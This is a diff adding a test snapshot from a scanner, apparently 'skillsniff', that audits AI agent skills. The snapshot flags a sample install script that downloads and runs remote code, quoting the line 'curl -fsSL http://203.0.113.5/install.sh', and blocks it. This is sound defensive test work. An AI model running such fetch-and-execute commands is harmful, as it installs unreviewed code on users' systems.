@@ -1,0 +1,85 @@
+---
+source: crates/skillsniff/tests/corpus.rs
+expression: value
+---
+{
+  "coverage": {
+    "agent_config": "ran",
+    "code": "ran",
+    "hidden": "ran",
+    "instructions": "ran"
+  },
+  "findings": [
+    {
+      "advice": "Do not use the skill.",
+      "evidence": "sh",
+      "explain": "The code fetches content from the network and executes it, so what runs is not what was reviewed.",
+      "locations": [
+        {
+          "file": "scripts/install.sh",
+          "line": 3
+        }
+      ],
+      "rule": "exec.download-and-run",
+      "severity": "critical",
+      "source": "engine",
+      "suppressed": false,
+      "title": "Downloads code and runs it"
+    },
+    {
+      "advice": "Check the script around the reported line.",
+      "evidence": "script does not parse from line 2; code there may be misread",
+      "explain": "The script does not parse cleanly, so the analysis of the code around the error may be incomplete.",
+      "locations": [
+        {
+          "file": "scripts/install.sh",
+          "line": 2
+        }
+      ],
+      "rule": "hidden.parse-errors",
+      "severity": "low",
+      "source": "engine",
+      "suppressed": false,
+      "title": "Script has syntax errors"
+    },
+    {
+      "advice": "Check which hosts it talks to and what it sends.",
+      "evidence": "curl -fsSL http://203.0.113.5/install.sh",
+      "explain": "The code sends or fetches data over the network.",
+      "locations": [
+        {
+          "file": "scripts/install.sh",
+          "line": 3
+        }
+      ],
+      "rule": "network.outbound",
+      "severity": "low",
+      "source": "engine",
+      "suppressed": false,
+      "title": "Makes a network request"
+    }
+  ],
+  "review": {
+    "applied": false,
+    "rejected_changes": []
+  },
+  "schema_version": "1",
+  "summary": {
+    "critical": 1,
+    "high": 0,
+    "low": 2,
+    "medium": 0
+  },
+  "target": {
+    "commit": null,
+    "source": "[source]",
+    "tree_sha256": "ddaf7d1b4741f30dbc6c55c330154c070ea94d7f1a5368546b2860ff46291758",
+    "type": "skill"
+  },
+  "tool": {
+    "name": "skillsniff",
+    "rules": "2026.11.1",
+    "version": "[version]"
+  },
+  "verdict": "BLOCK"
+}
